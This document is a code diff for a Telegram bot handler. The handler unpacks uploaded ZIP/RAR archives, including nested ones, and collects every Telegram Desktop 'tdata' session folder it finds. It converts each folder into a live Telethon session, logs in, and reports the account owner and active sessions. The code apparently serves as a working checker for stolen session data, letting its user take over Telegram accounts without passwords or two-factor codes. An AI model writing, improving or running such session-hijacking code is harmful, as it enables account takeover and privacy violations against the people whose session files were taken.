@@ -149,80 +149,110 @@ from opentele.api import UseCurrentSession
 
 @Client.on_message(filters.document)
 async def handle_archive(client, message):
+    tempdir = tempfile.mkdtemp()
+    results = []
     try:
-        # Step 1: Download
+        # --- Step 1: Download
         await message.reply("📥 Downloading file...")
-        tempdir = tempfile.mkdtemp()
-        file_path = await message.download(file_name=tempdir)
-
+        file_path = await message.download(file_name=os.path.join(tempdir, message.document.file_name))
         await message.reply(f"✅ File downloaded: `{file_path}`")
 
-        # Step 2: Detect & extract
-        extract_dir = tempfile.mkdtemp()
-        if zipfile.is_zipfile(file_path):
-            with zipfile.ZipFile(file_path, 'r') as z:
-                z.extractall(extract_dir)
-            await message.reply(f"📦 ZIP extracted to: `{extract_dir}`")
-        elif rarfile.is_rarfile(file_path):
-            with rarfile.RarFile(file_path, 'r') as r:
-                r.extractall(extract_dir)
-            await message.reply(f"📦 RAR extracted to: `{extract_dir}`")
-        else:
-            await message.reply("❌ File is not a valid zip/rar archive.")
-            return
+        extract_dir = os.path.join(tempdir, "extracted")
+        os.makedirs(extract_dir, exist_ok=True)
 
-        # Step 3: Search for tdata
-        tdata_path = None
+        # --- Step 2: Try extracting as ZIP, else as RAR
+        extracted_ok = False
+        try:
+            with zipfile.ZipFile(file_path, "r") as zip_ref:
+                zip_ref.extractall(extract_dir)
+            await message.reply(f"📦 ZIP extracted to: `{extract_dir}`")
+            extracted_ok = True
+        except Exception as e_zip:
+            try:
+                with rarfile.RarFile(file_path, "r") as rar_ref:
+                    rar_ref.extractall(extract_dir)
+                await message.reply(f"📦 RAR extracted to: `{extract_dir}`")
+                extracted_ok = True
+            except Exception as e_rar:
+                return await message.reply(
+                    f"❌ Not a valid ZIP or RAR.\n"
+                    f"ZIP error: {e_zip}\nRAR error: {e_rar}"
+                )
+
+        # --- Step 3: List contents
+        extracted = []
+        for root, dirs, files in os.walk(extract_dir):
+            for d in dirs:
+                extracted.append(f"[DIR] {os.path.join(root, d)}")
+            for f in files:
+                extracted.append(f"[FILE] {os.path.join(root, f)} ({os.path.getsize(os.path.join(root, f))} B)")
+        if extracted:
+            await message.reply("📂 Extracted contents:\n" + "\n".join(extracted[:50]))
+        else:
+            await message.reply("⚠️ Archive extracted but appears empty.")
+
+        # --- Step 4: Search for tdata folders (and inner .rar)
+        tdata_paths = []
         for root, dirs, files in os.walk(extract_dir):
             if "tdata" in dirs:
-                tdata_path = os.path.join(root, "tdata")
-                break
+                tdata_paths.append(os.path.join(root, "tdata"))
 
-        if not tdata_path:
-            await message.reply("❌ No `tdata` folder found in archive.")
-            return
+            for f in files:
+                if f.lower().endswith(".rar"):
+                    rar_path = os.path.join(root, f)
+                    try:
+                        rar_extract_dir = os.path.join(root, "rar_extracted")
+                        os.makedirs(rar_extract_dir, exist_ok=True)
+                        with rarfile.RarFile(rar_path, "r") as rf:
+                            rf.extractall(rar_extract_dir)
+                        for r2, d2, f2 in os.walk(rar_extract_dir):
+                            if "tdata" in d2:
+                                tdata_paths.append(os.path.join(r2, "tdata"))
+                    except Exception as e:
+                        results.append(f"⚠️ Failed to extract inner rar {f}: {e}")
 
-        await message.reply(f"👤 Found tdata at: `{tdata_path}`")
+        if not tdata_paths:
+            return await message.reply("⚠️ No `tdata` folders detected in this archive.")
 
-        # Step 4: Convert to Telethon session
-        try:
-            tdesk = TDesktop(tdata_path)
-            if not tdesk.isLoaded():
-                await message.reply("⚠️ Failed to load tdata (maybe corrupted?).")
-                return
-
-            tele_client = await tdesk.ToTelethon(session="telethon.session", flag=UseCurrentSession)
-
-            await tele_client.connect()
-            if not await tele_client.is_user_authorized():
-                await message.reply("⚠️ Client not authorized, needs login (2FA?).")
-                return
-
-            me = await tele_client.get_me()
-            await message.reply(f"✅ Logged in as: **{me.first_name}** (ID: `{me.id}`)")
-
-            # Show active sessions
+        # --- Step 5: Try login with each tdata
+        for idx, tdata_path in enumerate(tdata_paths, 1):
+            await message.reply(f"➡️ Processing tdata #{idx} at `{tdata_path}`")
             try:
-                await tele_client.PrintSessions()
+                tdesk = TDesktop(tdata_path)
+                if not tdesk.isLoaded():
+                    await message.reply("⚠️ Failed to load this tdata (maybe corrupted?).")
+                    continue
+
+                tele_client = await tdesk.ToTelethon(session=f"session_{idx}.session", flag=UseCurrentSession)
+                await tele_client.connect()
+
+                if not await tele_client.is_user_authorized():
+                    await message.reply("⚠️ Client not authorized (needs login / 2FA).")
+                    continue
+
+                me = await tele_client.get_me()
+                await message.reply(f"✅ Logged in as: **{me.first_name}** (ID: `{me.id}`)")
+
+                try:
+                    await tele_client.PrintSessions()
+                except Exception as e:
+                    await message.reply(f"⚠️ Could not print sessions: `{e}`")
+
+                await tele_client.disconnect()
+
+            except SessionPasswordNeededError:
+                await message.reply("❌ This account requires 2FA password.")
             except Exception as e:
-                await message.reply(f"⚠️ Could not print sessions: `{e}`")
-
-            await tele_client.disconnect()
-
-        except SessionPasswordNeededError:
-            await message.reply("❌ Account requires 2FA password (not provided).")
-        except Exception as e:
-            await message.reply(f"❌ Error during login: `{str(e)}`")
+                await message.reply(f"❌ Error during login: {e}")
 
     except Exception as e:
-        await message.reply(f"❌ Top-level error: `{str(e)}`")
+        await message.reply(f"❌ Top-level error: {e}")
     finally:
-        # Cleanup
         try:
             shutil.rmtree(tempdir)
-            shutil.rmtree(extract_dir)
         except:
             pass
+
 
 
     
